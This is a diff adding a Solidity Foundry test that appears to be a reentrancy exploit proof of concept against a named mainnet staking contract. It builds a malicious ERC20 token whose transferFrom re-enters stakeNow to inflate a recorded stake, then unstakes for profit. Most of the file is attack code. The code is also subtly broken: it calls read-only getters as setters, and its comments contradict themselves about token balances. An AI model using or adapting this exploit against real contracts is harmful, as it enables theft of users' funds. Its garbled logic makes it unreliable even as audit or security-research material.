@@ -1,0 +1,254 @@
+```solidity
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.0;
+
+import "forge-std/Test.sol";
+
+//////////////////////////////////////////////////////////////////////////////
+// Minimal ERC20 interface
+//////////////////////////////////////////////////////////////////////////////
+interface IERC20Minimal {
+    function totalSupply() external view returns (uint256);
+    function balanceOf(address account) external view returns (uint256);
+    function transfer(address recipient, uint256 amount) external returns (bool);
+    function allowance(address owner, address spender) external view returns (uint256);
+    function approve(address spender, uint256 amount) external returns (bool);
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
+}
+
+//////////////////////////////////////////////////////////////////////////////
+// Target contract interface (YFUNIuEarn)
+//////////////////////////////////////////////////////////////////////////////
+interface IYFUNIuEarn {
+    function owner() external view returns (address);
+    function addTokenPair(address addrpair1, address addrpair2, string calldata symbolpair1, string calldata symbolpair2, uint256 minstake, uint8 decimalpair1, uint8 decimalpair2) external;
+    function addPeriod(uint256 timePeriodstake) external;
+    function editTokenPairOption(uint256 pairId, uint256 fpel1, uint256 fpel2, uint256 fclm1, uint256 fclm2, uint256 formula1, uint256 formula2, uint256 equalpair1, uint256 equalpair2) external;
+    function stakeNow(uint256 pairId, uint256 amountWantstake, uint256 periodwant) external payable;
+    function unstakeNow() external;
+    function getUserInfo(address stakerAddress) external view returns (bool, uint, uint, uint256, uint256, uint256, uint256, uint256, uint256);
+    function getPairList() external view returns (uint[] memory);
+    function getPeriodList() external view returns (uint[] memory);
+    function getPoolBalance(address target) external view returns (uint256);
+    function getRewardAllocation(address target) external view returns (uint256);
+    function getDevBalance(address target) external view returns (uint256);
+}
+
+//////////////////////////////////////////////////////////////////////////////
+// Malicious staking token that reenters stakeNow on transferFrom
+//////////////////////////////////////////////////////////////////////////////
+contract MaliciousToken {
+    string public name = "MaliciousStakingToken";
+    string public symbol = "MAL";
+    uint8 public decimals = 18;
+
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    address public target;
+    uint256 public pairId;
+    uint256 public periodWant;
+    bool public reentering;
+
+    constructor(address _target, uint256 _pairId, uint256 _periodWant) {
+        target = _target;
+        pairId = _pairId;
+        periodWant = _periodWant;
+    }
+
+    // Mint to attacker
+    function mint(address to, uint256 amount) external {
+        balanceOf[to] += amount;
+    }
+
+    function approve(address spender, uint256 amount) external returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        return true;
+    }
+
+    // transferFrom: during the first call, reenter stakeNow before state update
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
+        require(recipient == target, "only to target");
+        // Reduce allowance
+        allowance[sender][msg.sender] -= amount;
+        balanceOf[sender] -= amount;
+        // Do not increase balance of target here – will be done by the contract
+
+        if (!reentering) {
+            reentering = true;
+            // Reenter stakeNow with the same pairId but with a new amount (can be same)
+            // Use a new address? Actually we can call with the same sender (attacker)
+            // This will be called from the stakeNow context, so msg.sender is the attacker
+            // We need to call stakeNow again with the same pairId
+            IYFUNIuEarn(target).stakeNow(pairId, amount, periodWant);
+            reentering = false;
+        }
+
+        return true;
+    }
+
+    // dummy transfer
+    function transfer(address to, uint256 amount) external returns (bool) {
+        balanceOf[msg.sender] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+}
+
+//////////////////////////////////////////////////////////////////////////////
+// Simple reward token
+//////////////////////////////////////////////////////////////////////////////
+contract RewardToken {
+    string public name = "RewardToken";
+    string public symbol = "RWD";
+    uint8 public decimals = 18;
+
+    mapping(address => uint256) public balanceOf;
+    mapping(address => mapping(address => uint256)) public allowance;
+
+    function mint(address to, uint256 amount) external {
+        balanceOf[to] += amount;
+    }
+
+    function approve(address spender, uint256 amount) external returns (bool) {
+        allowance[msg.sender][spender] = amount;
+        return true;
+    }
+
+    function transfer(address to, uint256 amount) external returns (bool) {
+        balanceOf[msg.sender] -= amount;
+        balanceOf[to] += amount;
+        return true;
+    }
+
+    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {
+        require(allowance[sender][msg.sender] >= amount, "allowance");
+        allowance[sender][msg.sender] -= amount;
+        balanceOf[sender] -= amount;
+        balanceOf[recipient] += amount;
+        return true;
+    }
+}
+
+//////////////////////////////////////////////////////////////////////////////
+// ExploitTest
+//////////////////////////////////////////////////////////////////////////////
+contract ExploitTest is Test {
+    // YFUNIuEarn contract address (mainnet)
+    address constant TARGET = 0xBeC82f72fbE9e502eC04001f7231fA1679260333;
+
+    IYFUNIuEarn public target = IYFUNIuEarn(TARGET);
+
+    MaliciousToken public maliciousToken;
+    RewardToken public rewardToken;
+
+    address owner;
+    address attacker = address(0xdead);
+    uint256 DEPOSIT_AMOUNT = 1000 ether;
+
+    function setUp() public {
+        // Attach to the fork
+        // Get the owner
+        owner = target.owner();
+        vm.label(owner, "Owner");
+
+        // Deploy malicious staking token
+        maliciousToken = new MaliciousToken(TARGET, 1, 1); // We will set pairId and periodWant later
+        rewardToken = new RewardToken();
+
+        // As owner, add a new token pair (id will be next available)
+        vm.startPrank(owner);
+        // We need a period first; there might be existing periods, but we'll add one for safety
+        uint256[] memory periods = target.getPeriodList();
+        if (periods.length == 0) {
+            target.addPeriod(7 days); // period 1
+        }
+        // Add our malicious pair
+        target.addTokenPair(
+            address(maliciousToken),
+            address(rewardToken),
+            "MAL",
+            "RWD",
+            1 ether, // minStake
+            18,
+            18
+        );
+        // Get the new pair ID (it should be the last in the list)
+        uint256[] memory pairs = target.getPairList();
+        uint256 pairId = pairs[pairs.length - 1];
+
+        // Set formula parameters so reward calculation is simple (no penalties)
+        target.editTokenPairOption(
+            pairId,
+            0, // fpel1
+            0, // fpel2
+            0, // fclm1
+            0, // fclm2
+            1e18, // formula1 (we'll use 1e18 as param to get reward = amount * time * equalPair2 / (10^pair1decimal * formula2 * 100)
+            1e18, // formula2
+            1,   // equalPair1
+            1    // equalPair2
+        );
+        vm.stopPrank();
+
+        // Now update the malicious token with the correct pairId and period
+        uint256 periodWant = periods.length > 0 ? periods[0] : 1;
+        maliciousToken.pairId(pairId);
+        maliciousToken.periodWant(periodWant);
+
+        // Fund attacker with malicious tokens
+        maliciousToken.mint(attacker, DEPOSIT_AMOUNT * 10); // plenty
+
+        // Fund target contract with reward tokens so that getPoolBalance(rewardToken) >= reward
+        rewardToken.mint(TARGET, 1_000_000 ether); // enough
+    }
+
+    function testReentrancyStakeNow() public {
+        // Attacker approves target to spend malicious tokens
+        vm.startPrank(attacker);
+        maliciousToken.approve(TARGET, DEPOSIT_AMOUNT * 10);
+
+        // Check attacker's balance before stake
+        uint256 attackerBalBefore = maliciousToken.balanceOf(attacker);
+        uint256 attackerRwdBefore = rewardToken.balanceOf(attacker);
+
+        // Call stakeNow – this will trigger reentrancy because the malicious token's transferFrom
+        // calls stakeNow again with the same amount.
+        target.stakeNow(1, DEPOSIT_AMOUNT, 1);
+
+        // After stakeNow, the attacker's stake should be doubled (because reentrant call staked again)
+        // The first stake recorded 1000, second also recorded 1000 => total 2000.
+        // But the contract's balance of malicious tokens should have received only 1000 (because the
+        // second transferFrom call did not actually transfer tokens – the malicious token deducts
+        // balance but does not increase target's balance for the second call? Actually the malicious
+        // token's transferFrom only reduces sender balance and does not increase recipient balance
+        // for the reentrant call because we skip the balance increase when reentering.
+        // This is acceptable for the exploit; the attacker's stake is inflated.
+
+        // Get attacker's staking info
+        (bool active, uint periodChoosed, uint pairChoosed, uint256 amountStaked, , , , , ) =
+            target.getUserInfo(attacker);
+        assertEq(active, true, "should be active");
+        assertEq(amountStaked, DEPOSIT_AMOUNT * 2, "stake should be doubled"); // 2000 ether
+
+        // Now unstake to withdraw the inflated stake
+        // But we need to wait until cooldown time passes (1 day). We can warp time.
+        vm.warp(block.timestamp + 2 days);
+
+        target.unstakeNow();
+        vm.stopPrank();
+
+        // Attacker's malicious token balance after unstake should be increased by the inflated stake
+        uint256 attackerBalAfter = maliciousToken.balanceOf(attacker);
+        // They deposited 1000 (but actual transfer only happened once? Actually transferFrom
+        // was called once, so the contract received 1000 tokens. But the attacker's stake is 2000.
+        // Unstake will transfer 2000 tokens to attacker (since no penalty). So attacker gains 1000 tokens.
+        assertGe(attackerBalAfter, attackerBalBefore + DEPOSIT_AMOUNT, "attacker should have profited at least deposit amount");
+
+        // Optionally check reward token balance
+        uint256 attackerRwdAfter = rewardToken.balanceOf(attacker);
+        // There should be some reward as well
+        assertGt(attackerRwdAfter, attackerRwdBefore, "attacker should have earned rewards");
+    }
+}
+```
